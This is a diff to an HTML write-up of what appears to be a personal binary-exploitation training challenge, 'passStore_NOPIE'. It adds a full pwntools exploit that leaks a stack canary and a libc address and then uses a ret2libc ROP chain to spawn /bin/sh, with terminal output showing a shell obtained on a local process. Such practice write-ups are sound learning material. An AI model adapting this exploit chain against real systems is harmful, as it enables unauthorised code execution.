@@ -426,6 +426,86 @@ strings -tw /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;
 
 </code></pre>
 <h3 id="exploit-code"><a class="header" href="#exploit-code">Exploit code</a></h3>
+<h4 id="exploit-code-ver1"><a class="header" href="#exploit-code-ver1">Exploit code ver1</a></h4>
+<pre><code class="language-python">from pwn import *
+
+binary = ELF('./passStore_NOPIE')
+libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
+rop = ROP(binary)
+r = process(binary.path)
+#gdb.attach(r , api=True)
+
+payload1 = b&quot;a&quot;*56
+r.sendlineafter(b&quot;Type the password: &quot;,payload1)
+
+r.recvline()
+
+canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
+canary += b&quot;\x00&quot;*(8 - len(canary))
+log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))
+
+main = binary.symbols['main'] 
+ret = rop.find_gadget(['ret'])[0] 
+
+
+payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p64(main+53)
+r.sendlineafter(b&quot;Retype: &quot;,payload2)
+
+payload3 = b&quot;a&quot;*248
+r.sendlineafter(b&quot;Type the password:&quot;,payload3)
+r.recvline()
+
+res = r.recv().split(b&quot;\nRetype&quot;)[0] 
+res += b&quot;\x00&quot;*(8 - len(res))
+leak = (u64(res) &lt;&lt; 8) + 0x0a 
+_libc_start_main_addr = leak - 0x4a 
+libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
+log.info(&quot;libc base addr : &quot; + hex(libc_base)) 
+
+
+system_offset = libc.symbols['system'] #
+binsh_offset = next(libc.search(b'/bin/sh\x00'))
+pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+system_addr = libc_base + system_offset
+binsh_addr = libc_base + binsh_offset
+log.info(&quot;system addr : &quot; + hex(system_addr)) 
+log.info(&quot;/bin/sh addr : &quot; + hex(binsh_addr)) 
+
+junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
+payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)
+
+r.sendline(payload4)
+
+r.interactive()
+
+</code></pre>
+<h4 id="result-ver1"><a class="header" href="#result-ver1">Result ver1</a></h4>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
+[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loaded 6 cached gadgets for './passStore_NOPIE'
+[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 25200
+[*] Leaked canary: 0xa5bb53678c3c3100
+[*] libc base addr : 0x7f8adb24b000
+[*] system addr : 0x7f8adb29bd60
+[*] /bin/sh addr : 0x7f8adb423698
+[*] Switching to interactive mode
+$ ls
+core  exploit.py  leak.py  passStore_NOPIE
+
+</code></pre>
+<h4 id="exploit-code-ver2"><a class="header" href="#exploit-code-ver2">Exploit code ver2</a></h4>
 <pre><code class="language-python">from pwn import *
 
 binary = ELF('./passStore_NOPIE')
@@ -482,7 +562,7 @@ r.sendline(payload4)
 
 r.interactive()
 </code></pre>
-<h3 id="result"><a class="header" href="#result">Result</a></h3>
+<h4 id="result-ver2"><a class="header" href="#result-ver2">Result ver2</a></h4>
 <pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
 [*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
     Arch:     amd64-64-little
